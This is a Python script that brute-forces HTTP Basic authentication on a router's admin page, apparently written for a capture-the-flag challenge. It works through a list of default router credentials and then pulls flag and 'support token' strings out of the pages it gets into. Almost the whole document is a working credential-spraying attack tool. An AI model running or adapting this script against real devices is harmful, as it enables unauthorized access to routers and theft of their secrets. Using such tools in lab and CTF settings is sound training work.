#!/usr/bin/env python3
"""
Brute-force HTTP Basic auth on NetGuard Router (:8060/admin).
Stops on first 200 OK and prints the token/flag candidates.
"""
import base64, re, sys, time, urllib.request, urllib.error

BASE = "http://10.110.3.72:8060/admin"

# Ordered by likelihood — the "one basic word" hint points at 'password',
# and CWE-1392 points at factory defaults.
CREDS = [
    # ── highest probability: default, single-word passwords ──
    ("admin", "password"),
    ("admin", "admin"),
    ("admin", "12345"),
    ("admin", "admin123"),
    ("admin", "letmein"),
    ("admin", "root"),
    ("admin", "toor"),
    ("admin", "secret"),
    ("admin", "default"),
    ("admin", "changeme"),
    ("admin", "netguard"),
    ("admin", "router"),
    ("admin", ""),
    # ── root variants ──
    ("root", "root"),
    ("root", "password"),
    ("root", "admin"),
    ("root", "toor"),
    # ── other common router defaults ──
    ("admin", "1234"),
    ("admin", "123456"),
    ("admin", "0000"),
    ("admin", "guest"),
    ("admin", "welcome"),
    ("admin", "pass"),
    ("admin", "Passw0rd"),
    ("admin", "password1"),
    ("user", "user"),
    ("guest", "guest"),
    ("support", "support"),
    # ── single "basic words" from the hint ──
    ("admin", "house"),
    ("admin", "door"),
    ("admin", "birth"),
    ("admin", "basic"),
    ("admin", "guard"),
    ("admin", "netguard"),
    ("admin", "home"),
    # ── fallback ──
    ("admin", "adminpassword"),
    ("admin", "Administrator"),
    ("Administrator", "password"),
    ("Administrator", "Administrator"),
]

FLAG_RE = re.compile(r'flag\{[a-f0-9]{8,}\}', re.I)
TOKEN_RE = re.compile(r'(?:ISP\s+support\s+token|support[\s_-]*token|token)[^<>]*?[:=]\s*([^\s<>"\']+)',
                      re.I)


def try_cred(user, pw):
    auth = base64.b64encode(f"{user}:{pw}".encode()).decode()
    req = urllib.request.Request(BASE, headers={
        "Authorization": f"Basic {auth}",
        "User-Agent": "Mozilla/5.0 (brute)",
    })
    try:
        with urllib.request.urlopen(req, timeout=6) as r:
            return r.status, r.read().decode(errors="replace")
    except urllib.error.HTTPError as e:
        return e.code, e.read().decode(errors="replace") if e.fp else ""
    except Exception as e:
        return 0, f"ERR {type(e).__name__}: {e}"


def main():
    hits = []
    for user, pw in CREDS:
        status, body = try_cred(user, pw)
        ok = (status == 200)
        marker = "\033[92m200 OK  \033[0m" if ok else f"\033[90m{status:<7}\033[0m"
        print(f"[{marker}] {user}:{pw}")
        if ok:
            hits.append((user, pw, body))
            flags = FLAG_RE.findall(body)
            toks  = TOKEN_RE.findall(body)
            if flags:
                print(f"           flag: {flags[0]}")
            if toks:
                print(f"           token candidates: {toks}")
            # Stop at first success — the flag is already there.
            if flags or toks:
                break
        time.sleep(0.1)

    if hits:
        u, p, body = hits[0]
        print(f"\n>> Success with {u}:{p}")
        with open("admin_page.html", "w") as fh:
            fh.write(body)
        print(">> Full page saved to admin_page.html")
        print(">> Flag candidates:",
              FLAG_RE.findall(body) or TOKEN_RE.findall(body))
    else:
        print("\n>> No credentials worked; extend CREDS with a bigger wordlist.")


if __name__ == "__main__":
    main()
